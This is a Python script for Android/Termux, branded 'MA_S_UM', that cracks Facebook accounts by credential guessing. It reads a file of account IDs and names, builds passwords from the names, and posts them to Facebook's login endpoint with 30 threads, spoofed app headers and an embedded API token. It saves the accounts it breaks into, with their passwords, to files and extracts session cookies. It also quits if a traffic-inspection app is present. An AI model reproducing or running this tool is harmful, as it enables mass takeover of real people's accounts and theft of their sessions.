import os,base64

#os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
	a = "anar"
	t="tt"
	fileee = os.listdir('/sdcard/Android/data/')
	if f'com.h{t}pc{a}y.pro' in fileee:
		print('Delete Http Canary');sys.exit()
except:pass

lm = '/data/data/com.termux/files/usr/lib/python3.11'
if not 'print' in open(lm+'/site-packages/requests/sessions.py','r').read():
	pass
else:sys.exit()

import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed 

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

ua = []

import requests
rs = requests.get
ua = []

del ua
"""
Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]
"""

ua=[]
logo = """

\033[97;1m  __  __    _      ____    _   _ __  __ 
\033[96;1m |  \/  |  / \    / ___|  | | | |  \/  |
\033[93;1m| |\/| | / _ \   \___ \  | | | | |\/| |
\033[94;1m | |  | |/ ___ \   ___) | | |_| | |  | |
\033[97;1m |_|  |_/_/   \_\ |____/   \___/|_|  |_|
                                                                                                       
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mMA_S_UM
\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m MA_S_UM jr.
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mMA_S_UM-cyber71
\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.1
\033[1;37m══════════════════════════════════════════\n"""
def clear ():
	os.system('clear')
	print (logo)
def linex():
	print('\033[1;37m)══════════════════════════════════════════')
def Main():
	clear()
	print("\033[1;32m[1] \033[1;37mFILE CLONING")
	print("\033[1;32m[2] \033[1;33mCONTACT ADMIN")
	print("\033[1;33m[0]\033[1;33m EXIT");linex()
	g = input("\033[1;32m[?] \033[1;37mChoose :- ")
	if g == '1':
		file()

	if g == '2':
		os.system("xdg-open ");Main()
	if g =='0':
		linex();exit("[•] Thanks for using tool \n[•] bye see you again ")
	else:
		linex();exit("[•] Thanks for using tool \n[•] bye see you again ")
		

l = []
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Hannan'
    else:
    	print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/M_T.txt");linex();file = input(f"\033[1;32m[?]\033[1;37m PUT FILE PATH : ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        linex();print(f"\033[1;32m[!]\033[1;31m File location not found ");time.sleep(3)
        Main()
     
    method()
    exit()
    
    
def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'\033[1;32m[?]\033[1;37m ENTER PASS LIMIT : ');clear() 
        if lp.isnumeric():
            print('\033[1;32m[•] \033[1;32mEXAMPLE :\033[1;37m first last,firtslast,first123');linex()
            for x in range(int(lp)):
                totalpass.append(input(f'\033[1;32m[?]\033[1;37m PUT PASSWORD\033[1;32m {x+1} : \033[1;37m '))
            pass
        else:
            linex();print(f"\033[1;32m[×] \033[1;31mONLY NUMERIC NUMBER")
            exit()
    clear()
    print(f'\033[1;32m[1] \033[1;37mMETHOD\033[1;32m > \033[1;37m1 ');linex()
    m=input(f"\033[1;32m[?] \033[1;37mCHOOSE :  ");clear()
    cpok=input('\033[1;32m[?] \033[1;37mSHOW CP ACCOUNT \033[1;32m(y/n) :\033[1;37m ')
 
    os.system("clear")
    print(logo) 
    
    print(f'\033[1;32m(√) Total IDs : \033[1;32m'+str(len(accounts)))
    
    print(f"\x1b[38;5;208m(!) Use Flight Mode For Speed UP");print('\033[1;37m(<•>)══════════════════════════════════════════')
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\r\033[1;97m[M_T]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:     
            heads = "Mozilla/5.0 (Linux; Android 12; Infinix X665C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/336.0.0.11.99;]"
            heads = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
            header = {"Content-Type": "application/x-www-form-accencoded",'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '1.7000000476837158',
    'referer': 'https://mbasic.facebook.com/login/?uid=100029543623795&flow=login_no_pin&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH2591"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=data,headers=header,allow_redirects=False)
      #      print(response.text) 
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\r\033[1;32m[MA_S_UM-OK] '+acc+' [✓] '+pword+'  ')
                open('/sdcard/M_T-OK.txt','a').write(f'{acc} [✓] {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\r\033[1;37m[MA_S_UM-CP] '+acc+' [•] '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/M_T-CP.txt','a').write(f'{acc} [•] {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    
    
    if m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    linex();print("\n\033[1;32m[✓] \033[1;33mYOUR PROCESS HAS BEEN COMPLETED");linex();input("\033[1;32m[✓] \033[1;31mPRESS ENTER TO BACK ");Main()
      
Main()